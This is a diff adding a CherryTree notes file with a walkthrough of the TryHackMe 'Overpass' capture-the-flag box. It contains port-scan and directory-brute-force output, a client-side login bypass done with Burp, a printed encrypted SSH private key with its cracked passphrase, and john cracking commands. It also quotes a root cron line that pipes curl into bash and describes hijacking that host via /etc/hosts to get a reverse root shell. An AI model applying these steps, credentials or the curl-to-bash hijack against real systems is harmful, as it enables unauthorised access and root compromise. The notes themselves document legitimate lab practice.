@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Overpass(THM)" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1614362644" ts_lastsave="1614362994">
+    <node name="ports" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1614362994" ts_lastsave="1614363008">
+      <rich_text>[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.227.85:22
+Open 10.10.227.85:80
+[~] Starting Script(s)
+[&gt;] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.91 ( </rich_text>
+      <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+      <rich_text> ) at 2021-02-26 13:05 EST
+Initiating Ping Scan at 13:05
+Scanning 10.10.227.85 [4 ports]
+Completed Ping Scan at 13:05, 0.49s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:05
+Completed Parallel DNS resolution of 1 host. at 13:05, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 13:05
+Scanning 10.10.227.85 [2 ports]
+Discovered open port 22/tcp on 10.10.227.85
+Discovered open port 80/tcp on 10.10.227.85
+Completed SYN Stealth Scan at 13:05, 0.49s elapsed (2 total ports)
+Nmap scan report for 10.10.227.85
+Host is up, received reset ttl 61 (0.45s latency).
+Scanned at 2021-02-26 13:05:37 EST for 1s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 61
+80/tcp open  http    syn-ack ttl 61
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 23 (4.688KB)
+</rich_text>
+    </node>
+    <node name="gobuster" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1614363016" ts_lastsave="1614363027">
+      <rich_text>/aboutus (Status: 301)
+/admin (Status: 301)
+/css (Status: 301)
+/downloads (Status: 301)
+/img (Status: 301)
+/index.html (Status: 301)
+===============================================================
+2021/02/26 13:08:53 Finished
+</rich_text>
+    </node>
+    <node name="notes" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1614370193" ts_lastsave="1614370195">
+      <rich_text>1- gobuster revealed a dir named admin
+2- login was not vulnerable to sqli 
+3- after analyzing source code we read in a login.js file that webapp verify the given access by checking if server response was "incorrectcredentials". 
+4-also in js file we know if credentials are ight a window.location function takes us to /admin
+5- using burp suite we modify the incoming response of server by removing incorrectcrdentials header and adding a new one as follows
+ location: /admin
+ 6-forwading this,js file validates us as this check is made at client side
+ 7- in admin pannnel we have ssh keys for james user
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+8- we crack these private keys into hashable format using ssh2john
+
+python3 /usr/share/john/ssh2john.py sshkeyfile &gt; sshhash.hash
+9- now using john we crack sshash.hash
+john sshhash.hash --wordlist=Wordlists/rockyou.txt
+passphrase is james13
+
+10-now we ssh into  james using
+ssh -i sshkeyfile james@ip
+11- we got the user flag
+12- now for privesc
+13- nothing wierd came in suid binaries and sudo -l requires password which we dont have access to
+14- cronjob  gave something suspecius
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+15- from this we know that buildscript.sh runs as a cronjob which is saved on web server
+16- after deatiled enumaration we couldnt find a way to web server directories
+17- but as cronjob hints that hostname overpass.thm is being used
+18- we can write to /etc/hosts
+19- we change overpass.thm to our own ip and then make a directory named download/src/buildcript.sh
+20- this script has an reverse shell code in it
+21- we also open a http server on our machine
+22- the machine thinks that we are overpass.thm and it executes builscript.sh as root which gives us a root shell back
+23- </rich_text>
+    </node>
+  </node>
+</cherrytree>
